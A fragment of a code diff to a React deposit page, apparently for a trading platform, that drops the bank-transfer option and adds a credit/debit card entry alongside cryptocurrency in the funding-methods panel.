             <div className={styles.doneDetails}>
               <div className={styles.doneRow}><span>Status</span><span className={styles.statusPending}>● Pending</span></div>
               <div className={styles.doneRow}><span>Amount</span><span>{formatUSD(parseFloat(usdAmount))}</span></div>
-              <div className={styles.doneRow}><span>Method</span><span>{method === 'bank_transfer' ? '🏦 Bank Transfer' : `₿ ${selectedNetwork?.symbol ?? 'Crypto'}`}</span></div>
-              <div className={styles.doneRow}><span>Est. time</span><span>{method === 'bank_transfer' ? '1–2 business hours' : '10–30 minutes'}</span></div>
+              <div className={styles.doneRow}><span>Method</span><span>₿ {selectedNetwork?.symbol ?? 'Crypto'}</span></div>
+              <div className={styles.doneRow}><span>Est. time</span><span>10–30 minutes</span></div>
             </div>
             <div className={styles.doneActions}>
               <button className={styles.btnPrimary} onClick={handleReset}>Make Another Deposit</button>
@@ -700,12 +772,12 @@ export default function DepositPage() {
         )}
       </div>
 
-      {/* Side info panel (replaces TradingView widget) */}
+      {/* Side info panel */}
       <div className={styles.widgetSide}>
         <div style={{ padding: '24px', height: '100%', display: 'flex', flexDirection: 'column', gap: '16px' }}>
           <h3 style={{ fontSize: '16px', fontWeight: 700, color: '#fff', marginBottom: '4px' }}>Funding Methods</h3>
           {[
-            { emoji: '🏦', title: 'Bank Transfer', lines: ['Transfer from any supported bank', 'Credited within 1–2 business hours', 'No deposit fees', 'Minimum: $10'] },
+            { emoji: '💳', title: 'Credit / Debit Card', lines: ['Visa, Mastercard & Amex accepted', 'Charged instantly via secure checkout', 'Card details never touch our servers', 'Minimum: $10'] },
             { emoji: '₿', title: 'Cryptocurrency', lines: ['Supports BTC, ETH, USDT & more', 'Credited after network confirmations', 'Processing: 10–30 minutes', 'Minimum varies by coin'] },
           ].map((m) => (
             <div key={m.title} style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '12px', padding: '16px' }}>
